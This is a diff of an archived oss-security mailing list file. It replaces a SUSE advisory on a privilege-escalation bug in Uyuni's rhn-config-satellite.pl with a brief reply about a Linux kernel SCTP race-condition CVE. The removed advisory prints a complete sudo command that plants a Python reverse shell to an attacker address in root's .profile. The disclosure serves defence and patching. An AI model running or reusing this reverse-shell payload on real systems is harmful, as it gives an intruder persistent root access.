@@ -1,110 +1,31 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/10/28/4
-Message-ID: <f2332f99-e7df-6841-3767-b9f2cb2edfc7@suse.com>
-Date: Thu, 28 Oct 2021 15:43:23 +0200
-From: Paolo Perego <paolo.perego@...e.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/05/10/1
+Message-ID: <20210510042443.GA19253@lorien.valinor.li>
+Date: Mon, 10 May 2021 06:24:43 +0200
+From: Salvatore Bonaccorso <carnil@...ian.org>
 To: oss-security@...ts.openwall.com
-Subject: spacewalk-admin: CVE-2021-40348: arbitrary local code execution by 'tomcat' user via rhn-config-satellite.pl
+Cc: Nadav Markus <nmarkus@...oaltonetworks.com>, Or Cohen <orcohen@...oaltonetworks.com>
+Subject: Re: CVE-2021-23133: Linux kernel: race condition in sctp sockets
 Content-Type: text/plain; charset=utf-8
 
-# Description
+Hi,
 
+On Sun, Apr 18, 2021 at 11:41:06AM +0300, Or Cohen wrote:
+> Hello,
+> 
+> This is an announcement about CVE-2021-23133 which is a race-condition
+> I found in Linux kernel sctp sockets (net/sctp/socket.c). It can lead to kernel
+> privilege escalation from the context of a network service or from
+> an unprivileged process if certain conditions are met.
+> 
+> The bug was fixed on April 13, 2021:
+> https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=b166a20b07382b8bc1dcee2a448715c9c2c81b5b
 
+It looks that additionally
+https://git.kernel.org/linus/34e5b01186858b36c4d7c87e1a025071e8e2401f
+refer to CVE-2021-23133.
 
-Hello list, during an internal audit a vulnerability was found in a perl 
-script from the uyuni[1] component (previously known as spacewalk[2], 
-discontinued on March 31st 2020). Uyuni is a configuration and 
-infrastructure management tool helping sysadmin's in their tasks over a 
-huge multitude of assets.
+Are both commits necessary?
 
-
-
-The rhn-config-satellite.pl script is intended to be run by the 'tomcat' 
-user using sudo without any password, to adjust Uyuni configuration.
-
-
-
-Due to a missing sanitization of the filename that can be used as config 
-file, a rogue 'tomcat' user can append arbitrary code to any files that 
-eventually will be executed later on by higher privileged users.
-
-
-
-Please consider the following attack scenario. An attacker gains 
-'tomcat' user on the victim server. Rogue 'tomcat' executes the 
-following command:
-
-
-
-sudo /usr/bin/rhn-config-satellite.pl --target=/root/.profile 
---option="export RHOST=\"192.168.122.1\";export RPORT=4444;python -c 
-'import 
-sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) 
-for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"
-
-
-
-The python code implementing a reverse shell is then appended to the 
-/root/.profile file and executed everytime root logs in. This results in 
-having arbitrary code execution with superuser privileges on the victim 
-system.
-
-
-
-# Affected versions
-
-This vulnerability was fixed in spacewalk-admin version 4.3.2-1 [3] (by 
-this commit on upstream [4]). All spacewalk-admin versions before 
-4.3.2-1 are vulnerable
-
-
-
-# Timeline:
-
-
-
-2021-08-30: vulnerability was reported to upstream authors
-
-2021-08-31: upstream authors acknowledge the vulnerability start working 
-on the fix.
-
-2021-08-31: received CVE from Mitre and offered authors an embargo until 
-2021-10-27
-
-2021-10-27: authors published fixes for a product containing spacewalk 
-as component
-
-2021-10-28: authors published fixes in upstream repository and 
-publication of findings
-
-
-
-[1] https://github.com/uyuni-project/uyuni
-
-[2] https://github.com/spacewalkproject/spacewalk
-
-[3] 
-https://github.com/uyuni-project/uyuni/releases/tag/spacewalk-admin-4.3.2-1
-[4] 
-https://github.com/uyuni-project/uyuni/commit/790c7388efac6923c5475e01c1ff718dffa9f052
-
-
-
-https://bugzilla.suse.com/show_bug.cgi?id=1190040
-
--- 
-
-
-
-(*_  Paolo Perego                           @thesp0nge
-
-//\  Software security engineer               suse.com
-
-V_/_ 0A1A 2003 9AE0 B09C 51A4 7ACD FC0D CEA6 0806 294B
-
--- 
-(*_  Paolo Perego                           @thesp0nge
-//\  Software security engineer               suse.com
-V_/_ 0A1A 2003 9AE0 B09C 51A4 7ACD FC0D CEA6 0806 294B
-
-Download attachment "OpenPGP_0xFC0DCEA60806294B.asc" of type "application/pgp-keys" (4749 bytes)
+Regards,
+Salvatore
